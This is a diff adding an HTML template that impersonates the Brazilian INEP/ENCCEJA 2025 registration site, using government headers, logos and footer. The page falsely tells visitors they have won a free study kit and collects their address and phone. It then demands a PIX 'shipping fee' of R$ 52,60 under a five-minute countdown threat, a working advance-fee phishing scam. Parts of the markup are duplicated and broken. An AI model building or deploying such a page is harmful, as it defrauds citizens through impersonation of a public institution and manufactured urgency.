@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>ENCCEJA 2025 - Inscrição Realizada</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+            font-weight: 600;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+        .success-icon {
+            color: #34D399;
+        }
+        .btn-primary {
+            background-color: #5d85ab;
+            color: white;
+            transition: all 0.2s ease;
+        }
+        .btn-primary:hover {
+            background-color: #4d7396;
+        }
+        .btn-primary:disabled {
+            background-color: #5d85ab;
+            color: rgba(255, 255, 255, 0.6);
+            cursor: not-allowed;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configurar evento para buscar CEP automaticamente
+            const cepInput = document.getElementById('cep');
+            let typingTimer;
+            
+            cepInput.addEventListener('input', function() {
+                clearTimeout(typingTimer);
+                
+                // Verifica se o CEP está completo (8 dígitos)
+                const cep = this.value.replace(/\D/g, '');
+                if (cep.length === 8) {
+                    // Aguarda um momento antes de fazer a busca
+                    typingTimer = setTimeout(function() {
+                        buscarEnderecoPorCep(cep);
+                    }, 300);
+                }
+            });
+            
+            // Configurar evento para submissão do formulário
+            const form = document.getElementById('endereco-form');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Validar campos obrigatórios
+                const requiredFields = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'telefone'];
+                let isValid = true;
+                
+                requiredFields.forEach(field => {
+                    const input = document.getElementById(field);
+                    if (!input.value.trim()) {
+                        isValid = false;
+                        input.classList.add('border-red-500');
+                    } else {
+                        input.classList.remove('border-red-500');
+                    }
+                });
+                
+                if (!isValid) {
+                    alert('Por favor, preencha todos os campos obrigatórios.');
+                    return;
+                }
+                
+                // Salvar o endereço no localStorage para uso posterior
+                const endereco = {
+                    cep: document.getElementById('cep').value,
+                    logradouro: document.getElementById('logradouro').value,
+                    numero: document.getElementById('numero').value,
+                    complemento: document.getElementById('complemento').value,
+                    bairro: document.getElementById('bairro').value,
+                    cidade: document.getElementById('cidade').value,
+                    uf: document.getElementById('uf').value,
+                    telefone: document.getElementById('telefone').value
+                };
+                
+                localStorage.setItem('enderecoData', JSON.stringify(endereco));
+                
+                // Se tudo estiver válido, redirecionar para a página de pagamento
+                // Endereço confirmado - continuar para pagamento
+                // Aqui você pode adicionar o redirecionamento para a página de pagamento
+            });
+            
+            // Validar o formulário quando mudar os campos
+            document.querySelectorAll('#endereco-form input, #endereco-form select').forEach(input => {
+                input.addEventListener('input', validateForm);
+            });
+            
+            // Inicialmente desabilitar o botão até que o formulário seja válido
+            validateForm();
+        });
+        
+        function validateForm() {
+            const requiredFields = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'telefone'];
+            let isValid = true;
+            
+            requiredFields.forEach(field => {
+                const input = document.getElementById(field);
+                if (!input.value.trim()) {
+                    isValid = false;
+                    input.classList.add('border-red-500');
+                } else {
+                    input.classList.remove('border-red-500');
+                    
+                    // Validação específica para CEP e telefone
+                    if (field === 'cep') {
+                        const cepPattern = /^\d{5}-?\d{3}$/;
+                        if (!cepPattern.test(input.value)) {
+                            isValid = false;
+                            input.classList.add('border-red-500');
+                        }
+                    }
+                    
+                    if (field === 'telefone') {
+                        const telPattern = /^\(\d{2}\) \d{5}-\d{4}$/;
+                        if (!telPattern.test(input.value)) {
+                            isValid = false;
+                            input.classList.add('border-red-500');
+                        }
+                    }
+                }
+            });
+            
+            document.getElementById('submit-button').disabled = !isValid;
+        }
+        
+        function buscarEnderecoPorCep(cep) {
+            // Mostrar indicador de carregamento
+            document.getElementById('loading-cep').classList.remove('hidden');
+            
+            // Fazer a requisição para a API de CEP
+            fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('loading-cep').classList.add('hidden');
+                    
+                    if (data.erro) {
+                        alert('CEP não encontrado. Por favor, verifique o número digitado.');
+                        return;
+                    }
+                    
+                    // Preencher os campos do formulário
+                    document.getElementById('logradouro').value = data.logradouro || '';
+                    document.getElementById('bairro').value = data.bairro || '';
+                    document.getElementById('cidade').value = data.localidade || '';
+                    document.getElementById('uf').value = data.uf || '';
+                    
+                    // Focar no campo de número
+                    document.getElementById('numero').focus();
+                    
+                    // Validar o formulário
+                    validateForm();
+                })
+                .catch(error => {
+                    document.getElementById('loading-cep').classList.add('hidden');
+                    alert('Erro ao buscar o CEP. Por favor, tente novamente.');
+                    console.error('Erro ao buscar CEP:', error);
+                });
+        }
+        
+        function formatarCep(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 8) {
+                value = value.substring(0, 8);
+            }
+            if (value.length > 5) {
+                value = value.replace(/^(\d{5})(\d{1,3})$/, '$1-$2');
+            }
+            input.value = value;
+            validateForm();
+        }
+        
+        // Função para formatar o telefone no formato (XX) XXXXX-XXXX 
+        function formatarTelefone(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+            if (value.length > 11) {
+                value = value.substring(0, 11); // Limita a 11 dígitos (com DDD)
+            }
+            
+            // Formata o número com os parênteses e hífen
+            if (value.length > 0) {
+                // Insere parênteses para o DDD
+                value = value.replace(/^(\d{2})/, '($1) ');
+                
+                // Insere hífen após o 5º dígito se o número tiver mais de 6 dígitos
+                if (value.length > 9) {
+                    value = value.replace(/^(\(\d{2}\) \d{5})(\d+)$/, '$1-$2');
+                }
+            }
+            
+            input.value = value;
+            validateForm();
+        }
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
+            </svg>
+        </div>
+    </div>
+    <!-- Main Content -->
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <!-- ENCCEJA Logo -->
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
+            </div>
+            <!-- Success Container -->
+            <div class="border border-gray-300 rounded">
+                <!-- Form Header -->
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg">
+                        Inscrição &gt; Confirmação
+                    </h2>
+                </div>
+                <!-- Content -->
+                <div class="p-8 text-center">
+                    <div class="success-icon mb-6">
+                        <i class="fas fa-check-circle text-green-500 text-7xl"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold mb-3 text-gray-800">Parabéns! Você Ganhou um Kit Completo para o Encceja 2025!</h3>
+                    <p class="text-lg mb-6 text-gray-600">
+                        Sua inscrição para o Encceja 2025 foi concluída com sucesso e você acaba de ganhar:
+                    </p>
+                    <div class="mb-6 text-left bg-green-50 p-4 rounded-lg">
+                        <ul class="list-disc list-inside">
+                            <li class="mb-2 text-gray-700"><span class="font-semibold">1 Apostila Completa</span> com todo o conteúdo que será cobrado no Encceja 2025</li>
+                            <li class="text-gray-700"><span class="font-semibold">1 Livro com 700 Questões</span> para você treinar e se preparar para a prova</li>
+                        </ul>
+                    </div>
+                    
+                    <p class="mb-4 text-left font-semibold text-red-600">
+                        Estes materiais são essenciais para quem quer ser aprovado no Encceja 2025!
+                    </p>
+                    <p class="mb-6 text-left text-gray-700">
+                        <strong>Atenção:</strong> Sem estes materiais de estudo, suas chances de aprovação serão muito reduzidas. Eles contêm exatamente o que você precisa estudar para passar na prova.
+                    </p>
+                    
+                    <!-- Imagem dos livros -->
+                    <div class="my-6">
+                        <img src="https://http2.mlstatic.com/D_NQ_NP_652146-MLB75158637721_032024-O.webp" alt="Kit Completo Encceja 2025" class="w-full max-w-md mx-auto rounded-lg shadow-md">
+                    </div>
+                    
+                    <!-- Formulário de endereço -->
+                    <div class="mt-8 mb-6">
+                        <h4 class="text-xl font-bold mb-4 text-gray-800">Confirme seu endereço para recebimento</h4>
+                        <form id="endereco-form" class="space-y-5 text-left">
+                            <div class="mb-4">
+                                <label class="block mb-1 font-medium">
+                                    CEP <span class="text-red-500">*</span>
+                                </label>
+                                <div class="relative">
+                                    <input type="tel" id="cep" class="w-full border border-gray-300 p-2 rounded-md" 
+                                           inputmode="numeric" pattern="[0-9]{5}-?[0-9]{3}"
+                                           placeholder="00000-000" maxlength="9" oninput="formatarCep(this)">
+                                    <span id="loading-cep" class="hidden absolute right-3 top-1/2 transform -translate-y-1/2">
+                                        <svg class="animate-spin h-5 w-5 text-gray-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                        </svg>
+                                    </span>
+                                </div>
+                                <p class="text-xs text-gray-500 mt-1">Digite o CEP para preencher o endereço automaticamente</p>
+                            </div>
+                            
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <label for="logradouro" class="block mb-1 font-medium">
+                                        Logradouro <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="logradouro" class="w-full border border-gray-300 p-2 rounded-md" placeholder="Rua, Avenida, etc">
+                                </div>
+                                <div>
+                                    <label for="numero" class="block mb-1 font-medium">
+                                        Número <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="numero" class="w-full border border-gray-300 p-2 rounded-md" placeholder="Número">
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label for="complemento" class="block mb-1 font-medium">
+                                    Complemento
+                                </label>
+                                <input type="text" id="complemento" class="w-full border border-gray-300 p-2 rounded-md" placeholder="Apto, Bloco, etc">
+                            </div>
+                            
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <label for="bairro" class="block mb-1 font-medium">
+                                        Bairro <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="bairro" class="w-full border border-gray-300 p-2 rounded-md" placeholder="Bairro">
+                                </div>
+                                <div>
+                                    <label for="cidade" class="block mb-1 font-medium">
+                                        Cidade <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="cidade" class="w-full border border-gray-300 p-2 rounded-md" placeholder="Cidade">
+                                </div>
+                            </div>
+                            
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <label for="uf" class="block mb-1 font-medium">
+                                        Estado <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="text" id="uf" class="w-full border border-gray-300 p-2 rounded-md" placeholder="UF">
+                                </div>
+                                <div>
+                                    <label for="telefone" class="block mb-1 font-medium">
+                                        Telefone <span class="text-red-500">*</span>
+                                    </label>
+                                    <input type="tel" id="telefone" class="w-full border border-gray-300 p-2 rounded-md" 
+                                           inputmode="numeric" placeholder="(00) 00000-0000" maxlength="15" oninput="formatarTelefone(this)">
+                                </div>
+                            </div>
+                            
+                            <div class="bg-blue-50 p-4 rounded-lg mb-4">
+                                <p class="text-blue-800">
+                                    <i class="fas fa-info-circle mr-2"></i>
+                                    O envio dos materiais será feito pelos Correios e chegará em até 4 dias úteis para o endereço informado.
+                                </p>
+                            </div>
+                            
+                            <div class="bg-yellow-50 p-4 rounded-lg text-center mb-4">
+                                <p class="text-yellow-800 font-semibold mb-2">Pagamento do frete pendente</p>
+                                <p class="text-gray-700 mb-3">Valor do frete: <span class="font-bold text-lg">R$ 52,60</span></p>
+                            </div>
+                            
+                            <div class="flex justify-center">
+                                <button type="button" id="submit-button" class="btn-primary py-3 px-6 rounded-md flex items-center" onclick="processarPagamentoFrete()">
+                                    <i class="fas fa-truck mr-2"></i>
+                                    Confirmar Endereço e Pagar Frete
+                                </button>
+                            </div>
+                            
+                            <!-- Modal de Pagamento PIX -->
+                            <div id="pixModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
+                                <div class="bg-white w-full h-full p-6 overflow-y-auto">
+                                    <div class="flex justify-between items-center mb-4">
+                                        <h3 class="text-xl font-bold">Pagamento do Frete via PIX</h3>
+                                        <button type="button" class="text-gray-500 hover:text-gray-700" onclick="closePixModal()">
+                                            <i class="fas fa-times text-xl"></i>
+                                        </button>
+                                    </div>
+                                    
+                                    <!-- Logo e Informações dos Correios -->
+                                    <div class="flex flex-col md:flex-row items-center mb-6 bg-blue-50 p-4 rounded-lg">
+                                        <img src="https://i0.wp.com/assets.b9.com.br/wp-content/uploads/2014/05/correios1.jpg?fit=769%2C192&ssl=1" 
+                                             alt="Correios" class="h-16 mb-4 md:mb-0 md:mr-4">
+                                        <div>
+                                            <p class="font-semibold text-blue-800">Frete SEDEX</p>
+                                            <p class="text-sm text-gray-600">Seu material será enviado pelos Correios e chegará em até 4 dias úteis após a confirmação do pagamento.</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Aviso de Urgência -->
+                                    <div class="mb-6 bg-red-50 p-4 rounded-lg text-red-700 border border-red-200">
+                                        <p class="font-bold mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> ATENÇÃO!</p>
+                                        <p>Se o pagamento não for realizado em até <span class="font-bold">5 minutos</span>, o material gratuito será cancelado e devolvido, sendo enviado para outro participante na lista de espera.</p>
+                                    </div>
+                                    
+                                    <!-- Contador Regressivo -->
+                                    <div class="text-center mb-6">
+                                        <p class="text-sm text-gray-600">Tempo restante para pagamento:</p>
+                                        <div id="countdown" class="text-2xl font-bold text-red-600">05:00</div>
+                                    </div>
+                                    
+                                    <div id="pixLoading" class="flex flex-col items-center justify-center py-10">
+                                        <div class="animate-spin h-10 w-10 border-4 border-blue-500 rounded-full border-t-transparent mb-4"></div>
+                                        <p class="text-gray-600">Gerando código PIX, aguarde...</p>
+                                    </div>
+                                    
+                                    <div id="pixContent" class="hidden flex flex-col items-center">
+                                        <!-- QR Code PIX -->
+                                        <div class="mb-4 border p-4 rounded-lg">
+                                            <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-48 h-48">
+                                        </div>
+                                        <!-- Código PIX para copiar -->
+                                        <div class="mb-6 w-full max-w-md">
+                                            <p class="text-sm mb-2 text-gray-600 text-center">Ou copie o código PIX abaixo:</p>
+                                            <div class="mb-2">
+                                                <input id="pixCodeText" type="text" readonly 
+                                                    class="w-full border border-gray-300 p-3 rounded-md bg-gray-50 text-sm"
+                                                    value="">
+                                            </div>
+                                            <div class="flex justify-center">
+                                                <button id="copyPixCodeBtn" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md flex items-center"
+                                                    onclick="copyPixCode()">
+                                                    <i class="fas fa-copy mr-2"></i> Copiar código PIX
+                                                </button>
+                                            </div>
+                                            <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                                                Código PIX copiado com sucesso!
+                                            </p>
+                                            </div>
+                                            <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                                                Código PIX copiado com sucesso!
+                                            </p>
+                                        </div>
+                                        
+                                        <div class="mb-4 text-center">
+                                            <p class="text-gray-600 mb-2">Valor a pagar: <span class="font-bold">R$ 52,60</span></p>
+                                            <p class="text-sm text-gray-500">Faça o pagamento pelo aplicativo do seu banco usando o QR Code ou código PIX acima.</p>
+                                        </div>
+                                        
+                                        <div class="text-center mb-6" id="paymentStatusMessage">
+                                            <p class="text-gray-600">Após o pagamento, aguarde alguns instantes para a confirmação.</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div id="pixError" class="hidden text-center text-red-600 py-6">
+                                        <i class="fas fa-exclamation-circle text-3xl mb-2"></i>
+                                        <p id="pixErrorMessage">Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.</p>
+                                    </div>
+                                    
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
+
+<!-- Modal de Pagamento PIX -->
+<div id="pixModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center hidden z-50">
+    <div class="bg-white w-full h-full p-6 overflow-y-auto">
+        <div class="flex justify-between items-center mb-4">
+            <h3 class="text-xl font-bold">Pagamento do Frete via PIX</h3>
+            <button type="button" class="text-gray-500 hover:text-gray-700" onclick="closePixModal()">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+        </div>
+        
+        <!-- Logo e Informações dos Correios -->
+        <div class="flex flex-col md:flex-row items-center mb-6 bg-blue-50 p-4 rounded-lg">
+            <img src="https://i0.wp.com/assets.b9.com.br/wp-content/uploads/2014/05/correios1.jpg?fit=769%2C192&ssl=1" 
+                 alt="Correios" class="h-16 mb-4 md:mb-0 md:mr-4">
+            <div>
+                <p class="font-semibold text-blue-800">Frete SEDEX</p>
+                <p class="text-sm text-gray-600">Seu material será enviado pelos Correios e chegará em até 4 dias úteis após a confirmação do pagamento.</p>
+            </div>
+        </div>
+        
+        <!-- Aviso de Urgência -->
+        <div class="mb-6 bg-red-50 p-4 rounded-lg text-red-700 border border-red-200">
+            <p class="font-bold mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> ATENÇÃO!</p>
+            <p>Se o pagamento não for realizado em até <span class="font-bold">5 minutos</span>, o material gratuito será cancelado e devolvido, sendo enviado para outro participante na lista de espera.</p>
+        </div>
+        
+        <!-- Contador Regressivo -->
+        <div class="text-center mb-6">
+            <p class="text-sm text-gray-600">Tempo restante para pagamento:</p>
+            <div id="countdown" class="text-2xl font-bold text-red-600">05:00</div>
+        </div>
+        
+        <div id="pixLoading" class="flex flex-col items-center justify-center py-10">
+            <div class="animate-spin h-10 w-10 border-4 border-blue-500 rounded-full border-t-transparent mb-4"></div>
+            <p class="text-gray-600">Gerando código PIX, aguarde...</p>
+        </div>
+        
+            <!-- Código PIX para copiar -->
+            <div class="mb-6 w-full max-w-md">
+                <p class="text-sm mb-2 text-gray-600 text-center">Ou copie o código PIX abaixo:</p>
+                <div class="mb-2">
+                    <input id="pixCodeText" type="text" readonly 
+                        class="w-full border border-gray-300 p-3 rounded-md bg-gray-50 text-sm"
+                        value="">
+                </div>
+                <div class="flex justify-center">
+                    <button id="copyPixCodeBtn" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md flex items-center"
+                        onclick="copyPixCode()">
+                        <i class="fas fa-copy mr-2"></i> Copiar código PIX
+                    </button>
+                </div>
+                <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                    Código PIX copiado com sucesso!
+                </p>
+                    </button>
+                </div>
+                <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                    Código PIX copiado com sucesso!
+                </p>
+            </div>
+            
+            <div class="mb-4 text-center">
+                <p class="text-gray-600 mb-2">Valor a pagar: <span class="font-bold">R$ 52,60</span></p>
+                <p class="text-sm text-gray-500">Faça o pagamento pelo aplicativo do seu banco usando o QR Code ou código PIX acima.</p>
+            </div>
+            
+            <div class="text-center mb-6" id="paymentStatusMessage">
+                <p class="text-gray-600">Após o pagamento, aguarde alguns instantes para a confirmação.</p>
+            </div>
+        </div>
+        
+        <div id="pixError" class="hidden text-center text-red-600 py-6">
+            <i class="fas fa-exclamation-circle text-3xl mb-2"></i>
+            <p id="pixErrorMessage">Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.</p>
+        </div>
+        
+        <!-- Botões de Ação -->
+        <div class="flex justify-center space-x-4 mt-4">
+        <!-- Sem botões de ação -->
+    </div>
+</div>
+    </div>
+</div>
+
+<script>
+    // Variáveis globais para controle do pagamento
+    let transactionId = null;
+    let countdownInterval = null;
+    let paymentCheckInterval = null;
+    
+    // Inicializar o formulário
+    document.addEventListener('DOMContentLoaded', function() {
+        // Só mudar o botão para type="button"
+        document.getElementById('submit-button').type = 'button';
+        document.getElementById('submit-button').setAttribute('onclick', 'processarPagamentoFrete()');
+        
+        // Inicializar botões
+        document.getElementById('copyPixCodeBtn').addEventListener('click', copyPixCode);
+        // Botão removido: document.getElementById('verificarPagamentoBtn').addEventListener('click', verificarPagamentoManual);
+    });
+    
+    // Função para processar o pagamento do frete
+    function processarPagamentoFrete() {
+        // Validar o formulário
+        const requiredFields = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'telefone'];
+        let isValid = true;
+        let invalidFields = [];
+        
+        requiredFields.forEach(field => {
+            const input = document.getElementById(field);
+            if (!input.value.trim()) {
+                isValid = false;
+                input.classList.add('border-red-500');
+                invalidFields.push(field);
+            } else {
+                input.classList.remove('border-red-500');
+            }
+        });
+        
+        if (!isValid) {
+            alert('Por favor, preencha todos os campos obrigatórios: ' + invalidFields.join(', '));
+            return;
+        }
+        
+        // Abrir o modal
+        openPixModal();
+        
+        // Iniciar contador regressivo
+        startCountdown(5 * 60); // 5 minutos em segundos
+        
+        // Preparar dados para o pagamento
+        const telefone = document.getElementById('telefone').value;
+        
+        // Fazer solicitação para criar o pagamento do frete
+        fetch('/pagar-frete', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ telefone: telefone })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                transactionId = data.transaction_id;
+                
+                // Mostrar o QR Code e código PIX
+                document.getElementById('pixQrCode').src = data.pixQrCode;
+                document.getElementById('pixCodeText').value = data.pixCode;
+                
+                // Esconder o loading e mostrar o conteúdo
+                document.getElementById('pixLoading').classList.add('hidden');
+                document.getElementById('pixContent').classList.remove('hidden');
+                // Botão removido: // document.getElementById('verificarPagamentoBtn').classList.remove('hidden');
+                
+                // Iniciar verificação automática do pagamento
+                startPaymentCheck();
+            } else {
+                showPixError(data.error || 'Não foi possível gerar o pagamento. Tente novamente.');
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao criar pagamento:', error);
+            showPixError('Erro de conexão ao gerar o pagamento. Tente novamente.');
+        });
+    }
+    
+    // Função para iniciar a verificação automática do pagamento
+    function startPaymentCheck() {
+        // Verificar a cada 5 segundos
+        paymentCheckInterval = setInterval(() => {
+            checkPaymentStatus();
+        }, 5000);
+    }
+    
+    // Função para verificar o status do pagamento
+    function checkPaymentStatus() {
+        if (!transactionId) return;
+        
+        fetch('/verificar-pagamento-frete', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ transactionId: transactionId })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Resposta da verificação de pagamento:', data);
+            
+            if (data.success) {
+                if (data.status === 'completed') {
+                    // Pagamento aprovado
+                    clearInterval(paymentCheckInterval);
+                    clearInterval(countdownInterval);
+                    
+                    // Mostrar mensagem de sucesso
+                    document.getElementById('paymentStatusMessage').innerHTML = `
+                        <div class="bg-green-100 p-4 rounded-lg text-green-800">
+                            <p class="font-bold"><i class="fas fa-check-circle mr-2"></i> Pagamento aprovado!</p>
+                            <p class="text-sm">O material será enviado em até 4 dias úteis.</p>
+                        </div>
+                    `;
+                    
+                    // Desabilitar o botão de verificação
+                    // document.getElementById('verificarPagamentoBtn').disabled = true;
+                    // document.getElementById('verificarPagamentoBtn').classList.add('bg-green-300');
+                    // document.getElementById('verificarPagamentoBtn').classList.remove('bg-green-600', 'hover:bg-green-700');
+                    // document.getElementById('verificarPagamentoBtn').textContent = 'Pagamento Confirmado';
+                    
+                    // Redirecionar após 3 segundos
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 3000);
+                }
+            } else {
+                console.error('Erro ao verificar pagamento:', data.error);
+            }
+        })
+        .catch(error => {
+            console.error('Erro de conexão ao verificar pagamento:', error);
+        });
+    }
+    
+    // Função para verificar o pagamento manualmente (botão "Já paguei")
+    function verificarPagamentoManual() {
+        checkPaymentStatus();
+        // Mostrar mensagem de verificação
+        document.getElementById('paymentStatusMessage').innerHTML = `
+            <div class="bg-blue-100 p-4 rounded-lg text-blue-800">
+                <p><i class="fas fa-spinner fa-spin mr-2"></i> Verificando pagamento...</p>
+            </div>
+        `;
+    }
+    
+    // Função para copiar o código PIX
+    function copyPixCode() {
+        const pixCodeText = document.getElementById('pixCodeText');
+        pixCodeText.select();
+        document.execCommand('copy');
+        
+        // Mostrar mensagem de copiado
+        const copyMessage = document.getElementById('copyMessage');
+        copyMessage.classList.remove('hidden');
+        
+        // Esconder a mensagem após 3 segundos
+        setTimeout(() => {
+            copyMessage.classList.add('hidden');
+        }, 3000);
+    }
+    
+    // Função para abrir o modal de PIX
+    function openPixModal() {
+        document.getElementById('pixModal').classList.remove('hidden');
+        document.getElementById('pixLoading').classList.remove('hidden');
+        document.getElementById('pixContent').classList.add('hidden');
+        document.getElementById('pixError').classList.add('hidden');
+        // document.getElementById('verificarPagamentoBtn').classList.add('hidden');
+    }
+    
+    // Função para fechar o modal de PIX
+    function closePixModal() {
+        document.getElementById('pixModal').classList.add('hidden');
+        
+        // Limpar intervalos
+        if (countdownInterval) clearInterval(countdownInterval);
+        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
+    }
+    
+    // Função para mostrar erro no modal
+    function showPixError(message) {
+        document.getElementById('pixLoading').classList.add('hidden');
+        document.getElementById('pixContent').classList.add('hidden');
+        document.getElementById('pixError').classList.remove('hidden');
+        document.getElementById('pixErrorMessage').textContent = message;
+    }
+    
+    // Função para iniciar o contador regressivo
+    function startCountdown(duration) {
+        let timer = duration;
+        const countdownElement = document.getElementById('countdown');
+        
+        // Limpar intervalo anterior se existir
+        if (countdownInterval) clearInterval(countdownInterval);
+        
+        countdownInterval = setInterval(() => {
+            const minutes = parseInt(timer / 60, 10);
+            const seconds = parseInt(timer % 60, 10);
+            
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (--timer < 0) {
+                clearInterval(countdownInterval);
+                countdownElement.textContent = '00:00';
+                
+                // Mostrar mensagem de tempo esgotado
+                document.getElementById('paymentStatusMessage').innerHTML = `
+                    <div class="bg-red-100 p-4 rounded-lg text-red-800">
+                        <p class="font-bold"><i class="fas fa-exclamation-circle mr-2"></i> Tempo esgotado!</p>
+                        <p class="text-sm">O material foi cancelado. Feche esta janela e tente novamente.</p>
+                    </div>
+                `;
+            }
+        }, 1000);
+    }
+</script>
